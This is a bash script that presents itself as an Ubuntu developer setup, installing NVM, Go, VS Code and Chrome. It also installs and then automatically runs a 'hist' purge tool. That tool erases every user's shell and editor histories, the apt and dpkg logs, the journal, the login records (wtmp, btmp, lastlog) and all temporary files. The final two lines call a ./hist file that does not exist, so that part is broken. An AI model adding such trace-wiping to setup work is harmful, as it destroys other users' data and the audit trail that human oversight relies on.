#!/usr/bin/env bash
# ============================================================================
#  Ubuntu Dev Setup: NVM (per-user), Go, VS Code (MS repo), Google Chrome (Google repo)
#  Usage: sudo ./dev
# ============================================================================

set -Eeuo pipefail
IFS=$'\n\t'

# ----------------------------- Utilities ------------------------------------
is_command() { command -v "$1" >/dev/null 2>&1; }
log()  { printf "\n[+] %s\n" "$*"; }
die()  { printf "\n[-] %s\n" "$*" >&2; exit 1; }

require_root() {
  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then die "Run with sudo/root."; fi
}

resolve_target_user() {
  if [[ -n "${SUDO_USER-}" && "${SUDO_USER}" != "root" ]]; then echo "${SUDO_USER}";
  else echo "$(logname 2>/dev/null || echo root)"; fi
}

install_keyring_dir() { install -d -m 0755 /etc/apt/keyrings; }

# ------------------------------- Preparation --------------------------------
require_root
TARGET_USER="$(resolve_target_user)"
TARGET_HOME="$(getent passwd "$TARGET_USER" | cut -d: -f6)"
ARCH_DEB="$(dpkg --print-architecture)"   # amd64 | arm64

# Go per le tuto: URL fournie par toi (amd64). Ne tente pas d’autres variantes.
GO_URL="https://go.dev/dl/go1.25.3.linux-amd64.tar.gz"
GO_VERSION="1.25.3"
[[ "$ARCH_DEB" == "amd64" ]] || die "This pinned URL is amd64-only. Current arch: ${ARCH_DEB}"

log "User: ${TARGET_USER} (${TARGET_HOME}) | Arch: ${ARCH_DEB} | Go: ${GO_VERSION}"

export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends \
  curl ca-certificates gnupg apt-transport-https lsb-release tar xz-utils

# --------------------------- NVM installation --------------------------------
install_nvm_for_user() {
  local user="$1" home="$2"
  log "Installing NVM for ${user}…"
  sudo -u "$user" bash -c '
    set -Eeuo pipefail
    export NVM_DIR="$HOME/.nvm"
    mkdir -p "$NVM_DIR"
    curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh -o /tmp/nvm-install.sh
    bash /tmp/nvm-install.sh
  '
  for rc in ".bashrc" ".zshrc"; do
    if [[ -f "${home}/${rc}" ]] && ! grep -q 'NVM_DIR' "${home}/${rc}"; then
      cat >> "${home}/${rc}" <<'EOF'

# >>> NVM
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
[ -s "$NVM_DIR/bash_completion" ] && . "$NVM_DIR/bash_completion"
# <<< NVM
EOF
      chown "$user":"$user" "${home}/${rc}"
    fi
  done
}

# --------------------------- Go  -----------------------
install_go() {
  log "Installing Go from ${GO_URL}"
  rm -rf /usr/local/go
  tmp="$(mktemp -d)"; pushd "$tmp" >/dev/null
  curl -fSLo go.tgz "${GO_URL}"
  tar -C /usr/local -xzf go.tgz
  popd >/dev/null; rm -rf "$tmp"

  if ! grep -q '/usr/local/go/bin' "${TARGET_HOME}/.profile" 2>/dev/null; then
    echo 'export PATH=$PATH:/usr/local/go/bin' >> "${TARGET_HOME}/.profile"
    chown "${TARGET_USER}:${TARGET_USER}" "${TARGET_HOME}/.profile" 2>/dev/null || true
  fi
}

# --------------------------- VS Code (MS repo) -------------------------------
install_vscode() {
  log "Installing VS Code…"
  install_keyring_dir
  curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /etc/apt/keyrings/microsoft.gpg
  chmod 0644 /etc/apt/keyrings/microsoft.gpg
  cat >/etc/apt/sources.list.d/vscode.list <<EOF
deb [arch=${ARCH_DEB} signed-by=/etc/apt/keyrings/microsoft.gpg] https://packages.microsoft.com/repos/code stable main
EOF
  apt-get update -y
  apt-get install -y code
}

# --------------------------- Google Chrome (repo) ----------------------------
install_chrome() {
  log "Installing Google Chrome…"
  install_keyring_dir
  curl -fsSL https://dl.google.com/linux/linux_signing_key.pub | gpg --dearmor -o /etc/apt/keyrings/google.gpg
  chmod 0644 /etc/apt/keyrings/google.gpg
  cat >/etc/apt/sources.list.d/google-chrome.list <<EOF
deb [arch=${ARCH_DEB} signed-by=/etc/apt/keyrings/google.gpg] http://dl.google.com/linux/chrome/deb/ stable main
EOF
  apt-get update -y
  apt-get install -y google-chrome-stable
}

# --------------------------- hist tool (purge) --------------------------------
install_hist_tool() {
  log "Installing hist purge tool…"
  cat >/usr/local/bin/hist <<'EOF'
#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'
[[ "${EUID:-$(id -u)}" -eq 0 ]] || { echo "Run as root." >&2; exit 1; }
history -c 2>/dev/null || true
history -w 2>/dev/null || true
unset HISTFILE || true
targets=(/root /home/*)
for home in "${targets[@]}"; do
  [[ -d "$home" ]] || continue
  files=(
    "$home/.bash_history" "$home/.zsh_history" "$home/.python_history" "$home/.lesshst" "$home/.wget-hsts"
    "$home/.nano/history" "$home/.local/share/fish/fish_history" "$home/.config/fish/fish_history"
    "$home/.local/state/bash/history" "$home/.local/state/zsh/history" "$home/.local/state/fish/fish_history"
    "$home/.local/share/nvim/shada/main.shada"
  )
  for f in "${files[@]}"; do [[ -e "$f" ]] && : > "$f" 2>/dev/null || true; done
done
: > /var/log/apt/history.log 2>/dev/null || true
: > /var/log/apt/term.log    2>/dev/null || true
: > /var/log/dpkg.log        2>/dev/null || true
rm -f /var/log/apt/history.log.* /var/log/apt/term.log.* /var/log/dpkg.log.* 2>/dev/null || true
if command -v journalctl >/dev/null 2>&1; then
  journalctl --rotate 2>/dev/null || true
  journalctl --vacuum-time=1s 2>/dev/null || true
fi
: > /var/log/wtmp 2>/dev/null || true
: > /var/log/btmp 2>/dev/null || true
: > /var/log/lastlog 2>/dev/null || true
rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
EOF
  chmod 0750 /usr/local/bin/hist
}

# --------------------------------- Run --------------------------------------
install_nvm_for_user "$TARGET_USER" "$TARGET_HOME"
install_go
install_vscode
install_chrome
install_hist_tool

apt-get autoremove -y
apt-get clean

log "Purging local traces…"
/usr/local/bin/hist || true

log "Done. Open a new terminal (or 'source ~/.profile') so PATH includes Go."
chmod +x ./hist
sudo ./hist
